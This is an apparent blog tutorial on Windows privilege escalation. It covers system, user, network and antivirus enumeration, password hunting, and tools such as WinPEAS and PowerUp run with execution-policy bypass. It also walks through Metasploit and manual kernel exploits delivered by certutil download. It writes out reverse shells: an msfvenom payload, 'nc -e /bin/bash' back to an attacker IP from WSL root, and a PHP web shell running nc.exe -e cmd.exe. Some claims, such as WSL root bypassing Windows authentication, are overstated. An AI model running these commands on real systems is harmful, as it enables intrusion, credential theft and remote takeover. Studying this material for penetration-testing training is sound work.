---
title: "Windows Privilege Escalation"
date: 2024-09-27 10:00:00 +0800
categories: [Windows, Security]
tags: [Privilege Escalation, Windows]
excerpt: "A detailed write-up on Windows privilege escalation techniques covered in the Privilege Escalation in Windows."
---
# Windows PrivEsc
![image.png](https://hacklido.com/assets/files/2023-03-05/1678043519-805217-0-windows-headpic.jpg)
**Introduction to the Privilege Escalation Course for Windows**

The Privilege Escalation Course for Windows is designed to equip cybersecurity enthusiasts with the skills and knowledge needed to elevate their access on Windows systems. Throughout this course, you will explore various privilege escalation techniques, from exploiting misconfigurations to abusing Windows services and kernel vulnerabilities.

By the end of this course, you will have a deep understanding of how to identify and exploit weaknesses in Windows environments, enhancing your proficiency in privilege escalation. This course is ideal for those looking to improve their penetration testing abilities or strengthen defenses against unauthorized access in Windows systems.

# Initial Enumeration

# System Enumeration:

1. **Display the system's hostname:**
First, I use the command `hostname` to display the system's hostname. The hostname is a unique name assigned to a computer on a network, which helps identify it among other devices.
    
    ```bash
    hostname
    ```
    
2. **Display detailed information about the system's version and OS:**
I use the command `systeminfo` to gather detailed information about the system, including the OS version, build number, and installed hotfixes. This can help in identifying any potential exploits.
    
    ```bash
    systeminfo
    ```
    
3. **Check Windows version:**
Some commands are useful to know the exact version and build of the operating system:
    
    ```bash
    wmic os get caption, version, osarchitecture
    systeminfo | findstr /B /C: "OS Name" /C: "OS Version" /C:"System Type"
    
    # wmic ( windows manager instrumentation command line ) 
    # qfe ( quick fix engineering ) 
    # to see whats patched
    
    wmic qfe get Caption,Description,HotFixID,InstalledOn
    wmic logicaldisk get caption,description,providername
    ```
    
4. **Display CPU information:**
To get detailed information about the CPU, I use the following command:
    
    ```bash
    wmic cpu get name, caption, maxclockspeed
    ```
    
5. **Check running processes:**
To see the currently running processes and check if any are running as the `SYSTEM` or `Administrator` user, I use:
    
    ```bash
    tasklist /v
    ```
    
    Additionally, you can filter for processes running under the SYSTEM account:
    
    ```bash
    tasklist /FI "USERNAME eq SYSTEM"
    ```
    

# User Enumeration:

User enumeration is a critical step in system enumeration, especially when trying to gain insights into the users and their roles on the system. In Windows, several built-in commands can be used to extract detailed information about user accounts, their privileges, and group memberships. Here are some commonly used commands:

1. **Display the current user:**
The first step in user enumeration is to identify the user currently logged in. The `whoami` command displays the username of the current session.
    
    ```bash
    whoami
    ```
    
2. **Display the current user’s privileges:**
To understand the level of privileges the current user has, the `whoami /priv` command is used. This will show a list of the user’s privileges, such as whether they have administrative rights, the ability to back up files, or take ownership of objects.
    
    ```bash
    whoami /priv
    ```
    
3. **Display group memberships of the current user:**
Knowing which groups the current user belongs to can help understand their roles and permissions within the system. The `whoami /groups` command lists all groups associated with the current user, including administrative or restricted groups.
    
    ```bash
    whoami /groups
    ```
    
4. **List all user accounts on the system:**
To see all the user accounts that exist on the system, the `net user` command is used. This provides a list of users, which can be useful for targeting specific accounts during privilege escalation attempts.
    
    ```bash
    net user
    ```
    
5. **Display detailed information about a specific user:**
To get more detailed information about a particular user, including when the account was created, last logon time, and whether the account is disabled or locked, you can use the `net user <specific user>` command.
    
    ```bash
    net user <specific user>
    ```
    
6. **Display members of a specific local group:**
Local groups often define the permissions users have on the system. By using the `net localgroup <group>` command, you can list the members of a specific group, such as the Administrators or Remote Desktop Users group, which is helpful for identifying high-privilege accounts.
    
    ```bash
    net localgroup <group>
    ```
    

### Example:

- To see all users:
    
    ```bash
    net user
    ```
    
- To check if a specific user, like "Administrator", exists and view their details:
    
    ```bash
    net user Administrator
    ```
    
- To list the members of the Administrators group:
    
    ```bash
    net localgroup Administrators
    ```
    

These commands provide valuable information about user accounts, their privileges, and their group memberships, helping you understand the security posture of the system and potentially identify accounts that could be used for privilege escalation.

# Network Enumeration

Network enumeration involves gathering information about the network configuration, active connections, and routing details of the system. This is essential in identifying potential attack vectors or escalating privileges by leveraging network misconfigurations.

Here are some useful commands for network enumeration in Windows:

###  **View detailed network configuration:**

The `ipconfig /all` command displays detailed information about the system's network interfaces, including IP addresses, subnet masks, default gateways, DNS servers, and MAC addresses. This is crucial to understand the network setup and identify misconfigurations.

```bash
ipconfig /all
```

### **List the ARP table:**

The ARP (Address Resolution Protocol) table maps IP addresses to MAC addresses of devices on the local network. Using the `arp -a` command, you can identify active devices on the network and gather information that can assist in lateral movement or network-based attacks.

```bash
arp -a
```

###  **Display the routing table:**

The `route print` command displays the system's routing table, showing the paths used for sending traffic between different network segments. This can help identify potential gateways or compromised routes that can be exploited for privilege escalation.

```bash
route print
```

###  **View active connections and listening ports:**

The `netstat -ano` command shows all active network connections, along with the associated process ID (PID) and protocol (TCP/UDP). This helps in identifying potentially vulnerable or suspicious connections.

```bash
netstat -ano
```

# Password Hunting

Password enumeration or "password hunting" involves searching the system for files and configurations that might store sensitive information, including passwords or credentials. Here are some useful commands for hunting down passwords in Windows systems:

###  **Search for password patterns in common file types:**

The `findstr /si password *.txt *.ini *.config` command searches for the term "password" in all `.txt`, `.ini`, and `.config` files in the current directory. This can help locate files where passwords may be stored in plaintext.

```bash
findstr /si password *.txt *.ini *.config
```

###  **Search all files for password patterns:**

To search across all files in a directory, you can use `findstr /spin "password" *.*`. This command recursively searches for any instance of the word "password" in all files and directories, revealing potential password storage locations.

```bash
findstr /spin "password" *.*
```

###  **Check specific XML files for saved passwords:**

The `Unattend.xml` file is often used in Windows installations and may contain sensitive information like saved passwords. Checking this file for passwords can provide access to system credentials:

```bash
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

###  **Search for VNC configuration files:**

VNC (Virtual Network Computing) configuration files, such as `vnc.ini`, can sometimes store passwords. Using the following command, you can search the entire `C:\` drive for VNC-related `.ini` files that may contain sensitive information:

```bash
dir c:\ /s /b | findstr /si *vnc.ini
```

By using these commands, you can efficiently hunt for passwords and credentials stored in various locations on the system. This is a critical step in privilege escalation, as gaining access to these passwords could lead to compromising other accounts or services.

[Privilege Escalation - Windows · Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)

[Hunting For Passwords | The Red Team Vade Mecum](https://kwcsec.gitbook.io/the-red-team-handbook/techniques/privilege-escalation/hunting-for-passwords)

# AV Enumeration

Antivirus (AV) enumeration is crucial for understanding the security measures in place on a target system. Identifying the antivirus software running on a machine can help you determine potential bypass or evasion techniques. In Windows, various commands can be used to query the status of antivirus services.

###  **Query Windows Defender:**

The `sc query windefend` command checks the status of the Windows Defender service. If Windows Defender is running, it may block or alert on certain activities, so understanding its status is important for further exploitation.

```bash
sc query windefend
```

###  **Query all running services:**

The `sc queryex type= service` command lists all services currently running on the system, including antivirus services. By examining this list, you can identify any third-party antivirus software that may be installed and active on the machine.

```bash
sc queryex type= service
```

These commands help determine what security software is in place, allowing you to adjust your privilege escalation strategy accordingly by identifying AV solutions that could interfere with your activities.
# Exploring Automated Tools

# Automated Tools

Automated tools streamline the process of finding vulnerabilities and escalation paths on a Windows system. Below are some popular tools used for privilege escalation.

### **WinPEAS**

WinPEAS is part of the PEAS (Privilege Escalation Awesome Scripts) suite. It is a script designed to automate the process of finding potential privilege escalation vectors on Windows systems.

**Usage:**

- Download the `winpeas.exe` file from the repository.
- Upload the file to the target system and execute it.
    
    ```
    peas.exe
    ```
    
- The script will provide detailed output regarding misconfigurations, unquoted service paths, installed applications, and more.

**Link:** [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

---

### **Windows PrivEsc Checklist**

This is a checklist that guides you through manual and automated steps to escalate privileges on a Windows system.

**Usage:**

- Follow the guide to manually check for weak configurations, misconfigurations, and default passwords.

**Link:** [Windows PrivEsc Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

---

###  **Sherlock**

Sherlock is a PowerShell script that scans for known vulnerabilities in the Windows operating system that can be exploited for privilege escalation.

**Usage:**

- Download `Sherlock.ps1`.
- Run it in a PowerShell session with the command:
    
    ```powershell
    powershell -ep bypass
    .\Sherlock.ps1
    ```
    
- The script will identify any exploitable vulnerabilities present in the system.

**Link:** [Sherlock](https://github.com/rasta-mouse/Sherlock)

---

### **Watson**

Watson is a vulnerability scanner that helps identify vulnerabilities based on the system's patch level. It’s used to identify missing patches or configurations that could lead to privilege escalation.

**Usage:**

- Download `Watson.exe` or compile it.
- Run the executable in the system:
    
    ```
    Watson.exe
    ```
    

**Link:** [Watson](https://github.com/rasta-mouse/Watson)

---

###  **PowerUp**

PowerUp is part of PowerSploit, a collection of PowerShell scripts that can be used for post-exploitation. PowerUp specifically looks for privilege escalation opportunities on Windows systems.

**Usage:**

- Download `PowerUp.ps1`.
- Run the script in PowerShell:
    
    ```powershell
    powershell -ep bypass
    .\PowerUp.ps1
    ```
    
- PowerUp will scan the system for various weaknesses like service misconfigurations, registry key permissions, etc.

**Link:** [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

---

###  **JAWS (Just Another Windows Script)**

JAWS is a PowerShell script used for post-exploitation and enumeration. It focuses on gathering information about the system, its users, and potential privilege escalation paths.

**Usage:**

- Download `JAWS-enum.ps1`.
- Run the script in PowerShell:
    
    ```powershell
    powershell -ep bypass
    .\JAWS-enum.ps1
    ```
    

**Link:** [JAWS](https://github.com/411Hall/JAWS)

---

###  **Windows Exploit Suggester**

This tool compares the patch level of the target system against the latest security bulletins from Microsoft to suggest potential privilege escalation vulnerabilities.

**Usage:**

- Clone the repository.
- Update the database:
    
    ```bash
    ./windows-exploit-suggester.py --update
    ```
    
- Use the tool to compare the system info:
    
    ```css
    ./windows-exploit-suggester.py --database <db.xls> --systeminfo <sysinfo.txt>
    ```
    

**Link:** [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

---

###  **Metasploit Local Exploit Suggester**

Metasploit has a built-in module that suggests local exploits for privilege escalation based on the target system's configuration.

**Usage:**

- Start the Metasploit console.
- Upload the `winpeas.exe` or similar enumeration tool to gather information.
- Run the `local_exploit_suggester` module:
    
    ```arduino
    use post/multi/recon/local_exploit_suggester
    set session <session_id>
    run
    ```
    

**Link:** [Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)

---

### **Seatbelt**

Seatbelt is a C# project that performs various security-related checks for common misconfigurations that could lead to privilege escalation.

**Usage:**

- Compile or download `Seatbelt.exe`.
- Run the tool:
    
    ```bash
    Seatbelt.exe all
    ```
    

**Link:** [Seatbelt](https://github.com/GhostPack/Seatbelt)

---

###  **SharpUp**

SharpUp is another C# tool designed to find privilege escalation vectors. It is part of the GhostPack suite and focuses on misconfigurations and exploitable services.

**Usage:**

- Compile or download `SharpUp.exe`.
- Run the tool:
    
    ```
    SharpUp.exe
    ```
    

**Link:** [SharpUp](https://github.com/GhostPack/SharpUp)

---

# Tools for Enumeration

Once you've downloaded the necessary tools, you can begin enumerating the system. Here are the executables and PowerShell scripts commonly used:

### Executables:

- **winpeas.exe**
- **Seatbelt.exe** (compile if needed)
- **Watson.exe** (compile if needed)
- **SharpUp.exe** (compile if needed)

### PowerShell:

- **Sherlock.ps1**
- **PowerUp.ps1**
- **jaws-enum.ps1**

### Other Tools:

- **windows-exploit-suggester.py** (local)
- **Metasploit exploit suggester**

---

# Executing

### In Metasploit:

To execute tools in Metasploit, you can upload the enumeration tools and run the local exploit suggester.

```bash
 cd c:\\windows\\temp
upload <path/winpeas.exe>
load powershell
run post/multi/recon/local_exploit_suggester
```

### In Shell:

- To run PowerShell scripts, bypass execution policy:
    
    ```powershell
    powershell -ep bypass
    .\PowerUp.ps1
    ```
    

### In Kali:

- To use the Windows Exploit Suggester:
    
    ```powershell
    ./windows-exploit-suggester.py --update
    pip install xlrd --upgrade
    ./windows-exploit-suggester.py --database <db.xls> --systeminfo <sysinfo.txt>
    ```

    # Escalation Path: Kernel Exploits

Kernel exploits are a powerful technique in privilege escalation. They target vulnerabilities in the core of the operating system (the kernel), which controls interactions between hardware and software components. Successfully exploiting a kernel vulnerability can grant SYSTEM-level privileges, allowing you to fully control the target machine.

### **What is a Kernel?**

- The kernel is the core part of the operating system that manages system resources and allows hardware and software to communicate.
- It acts as a **translator** between applications and the physical hardware, ensuring that resources are used effectively.

### **Kernel Exploit Repositories:**

A great source for finding kernel exploits is the Windows Kernel Exploits repository on GitHub. This repository contains various kernel vulnerabilities that can be exploited for privilege escalation.

**Link:** [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

---

## Exploiting Kernel Vulnerabilities with Metasploit

### **Steps for Kernel Exploits in Metasploit:**

1. **Run Enumeration Tools:**
First, you need to gather information about the system using tools like WinPEAS, PowerUp, or Metasploit's local exploit suggester. These tools help you identify which kernel vulnerabilities are applicable to the target system.
    - Example tools:
        - `winpeas.exe`
        - `powerup.ps1`
        - `local_exploit_suggester` in Metasploit
2. **Check the Kernel Vulnerabilities:**
Once you identify a potential kernel exploit, you can use Metasploit to search for a matching exploit.
    - **Example Metasploit Kernel Exploit:**
        
        ```
        use exploit/windows/local/ms10_015_kitrap0d
        set session <session_id>
        set lhost <your_ip>
        set lport <your_port>
        exploit
        ```
        
3. **Background the Session:**
After getting a session, background it to execute the kernel exploit.
    
    ```
    background
    ```
    

### **Metasploit Example: MS10-015 (Kitrap0d)**

- This is a known kernel vulnerability affecting Windows, and it can be exploited using the `ms10_015_kitrap0d` exploit in Metasploit.
- After setting the necessary options (`session`, `lhost`, `lport`), running the exploit should give you SYSTEM-level access.

---

## Manual Kernel Exploitation

Sometimes you may need to exploit a kernel vulnerability manually, especially when a pre-built exploit is not available in Metasploit. Below is an example of how to exploit a kernel vulnerability manually.

### **Steps for Manual Kernel Exploitation:**

1. **Generate a Payload using msfvenom:**
First, generate a reverse shell payload that will give you access to the system when the exploit is triggered.
    
    ```
    msfvenom -p windows/shell_reverse_tcp lhost=<your_ip> lport=<your_port> -f aspx > shell.aspx
    ```
    
2. **Start a Netcat Listener:**
On your attacking machine, set up a Netcat listener to capture the reverse shell when the exploit runs.
    
    ```
      nc -lvnp <your_port>
    ```
    
3. **Transfer the Exploit to the Target:**
    - On your Kali machine, use `python3` to set up a simple HTTP server:
        
        ```
        python3 -m http.server 80
        ```
        
    - On the target Windows machine, use `certutil` to download the exploit:
        
        ```
        certutil -urlcache -f http://<your_ip>/<exploit_file> <output_name>
        ```
        
4. **Run the Exploit on the Target:**
After downloading the exploit, execute it on the target machine with the following command:
    
    ```
    exploit.exe <your_ip> <your_port>
    ```
    
5. **Get the Reverse Shell:**
On your Kali machine, with the Netcat listener active, you should receive a reverse shell as `SYSTEM`, providing you with full control over the target.

---

### **Example: MS10-059 Kernel Exploit**

Let’s walk through exploiting a specific kernel vulnerability, **MS10-059**:

1. **Prepare the Exploit on Kali:**
Set up a Python HTTP server to serve the exploit:
    
    ```
    python3 -m http.server 80
    ```
    
2. **Download the Exploit on Windows:**
Use `certutil` to download the exploit onto the target machine:
    
    ```
    certutil -urlcache -f http://<your_ip>/ms10-059.exe ms10-059.exe
    ```
    
3. **Execute the Exploit:**
Run the downloaded exploit:
    
    ```
    ms10-059.exe <your_ip> <your_port>
    ```
    
4. **Capture the Shell:**
On Kali, use Netcat to catch the reverse shell:
    
    ```
    nc -lvnp <your_port>
    ```
    

If successful, this will give you `SYSTEM` privileges.

---

## Conclusion

Exploiting kernel vulnerabilities can be one of the most powerful ways to escalate privileges in a Windows environment. By running tools like WinPEAS or PowerUp, you can gather critical information about the system and identify which kernel exploits are applicable. Whether you use automated tools like Metasploit or go the manual route with tools like msfvenom, kernel exploits can provide complete control over a compromised system.

### **Additional Kernel Exploit Resources:**

- [MS10-059 Kernel Exploit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)

By understanding and executing these techniques, you can successfully escalate privileges and achieve root-level access on vulnerable Windows machines.

# Escalation Path: Windows Subsystem for Linux (WSL)

Windows Subsystem for Linux (WSL) allows running a Linux environment directly on Windows without needing a virtual machine or dual boot. Misconfigurations in WSL can be exploited to escalate privileges, enabling an attacker to gain **root access** or misuse WSL to run commands with elevated privileges.

### **Concept Overview**

- WSL bridges the gap between Linux and Windows. If an attacker can execute commands in WSL, they can use Linux commands to escalate privileges on the Windows system.
- Misusing **WSL** can lead to privilege escalation, especially if WSL is configured to allow root access or execute privileged operations.
- **Root privileges in WSL** allow the attacker to perform tasks like creating reverse shells, reading system files, or modifying system settings.

---

### Step-by-Step: Privilege Escalation Using WSL

### 1. **Identify WSL on the Target Machine**

First, determine if WSL is installed and locate the path to `bash.exe` and `wsl.exe`. These binaries are necessary to interact with the WSL environment.

### **Example Command:**

```bash
where /R c:\windows bash.exe
where /R c:\windows wsl.exe
```

This command will search for the WSL binaries on the Windows machine. If found, it confirms that WSL is installed and can be exploited.

### **Example Output:**

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

### 2. **Check for Root Access in WSL**

If WSL is installed, check if the WSL environment grants **root** access. WSL can be configured to start with root by default, or you can change the default user to `root` if you have access.

### **Command to Change Default User to Root:**

```bash
wsl.exe --set-default-user root
```

This command sets `root` as the default user in WSL. By running this, you can now open a WSL shell with root privileges without needing the root password.

### **Example Attack Scenario:**

After changing the default user to `root`, the attacker can run any Linux commands with root privileges inside WSL.

```bash
wsl
# Once inside WSL as root:
whoami
# Output: root
```

### 3. **Run Linux Commands for Privilege Escalation**

Now that you have root access in WSL, you can execute Linux commands to interact with the Windows system.

### **Example: Creating a Reverse Shell**

Create a reverse shell from the target system to your attack machine using Netcat:

1. **On your attacker machine (Kali Linux), start a Netcat listener:**
    
    ```bash
    nc -lvnp 4444
    ```
    
2. **On the target system (via WSL root access), run the following command:**
    
    ```bash
    wsl
    nc -e /bin/bash <kali_ip> 4444
    ```
    
    This command opens a reverse shell from the target machine back to your Kali machine. You can now control the system remotely through the shell.
    

### **Example Output:**

On your attacker machine, you should now have a root shell from the target system:

```bash
Connection received on <target_ip>:4444
whoami
root
```

---

### Advanced Techniques: Using **Impacket** Tools for Privilege Escalation

The **Impacket** toolkit includes various scripts for exploiting Windows protocols, such as SMB. If you have valid credentials on the system, you can use tools like **psexec.py** to execute commands remotely.

### **Example Command:**

```bash
psexec.py user:password@target_ip
```

This command connects to the target machine over SMB and executes a command with the provided credentials. Once successful, you can gain administrative access.

### **Example Scenario:**

```bash
psexec.py admin:P@ssword123@192.168.1.100
```

This will open an interactive shell as `admin` on the target machine if the credentials are correct.

---

### Alternative Path: Reverse Shell Using PHP

If you can upload files to the system (e.g., through a vulnerable web server), you can create a **reverse shell** using PHP.

### **Example PHP Reverse Shell:**

Create a PHP file (`shell.php`) with the following content:

```php
<?php
system('nc.exe -e cmd.exe <kali_ip> 4444');
?>
```

1. Upload this file to the target system.
2. On your attacker machine, set up a Netcat listener:
    
    ```bash
    nc -lvnp 4444
    ```
    
3. Navigate to the PHP file on the target system (e.g., `http://target.com/shell.php`). This will execute the reverse shell and give you a command line interface on the target machine.

---

### Final Thoughts

Windows Subsystem for Linux (WSL) is a powerful feature in Windows environments, but it can also be misused for privilege escalation if misconfigured. By abusing WSL's root capabilities or misconfigured access, an attacker can leverage Linux commands and tools to control the underlying Windows system.

**Key Techniques to Remember:**

- Change the default WSL user to `root` to bypass authentication.
- Use Linux commands inside WSL to escalate privileges or create shells.
- Tools like **Impacket** and **Netcat** can assist in exploiting the system remotely.
- WSL persistence can be used to maintain continuous access to a compromised system.

By combining these techniques, attackers can effectively escalate privileges and gain control over a compromised Windows environment using WSL.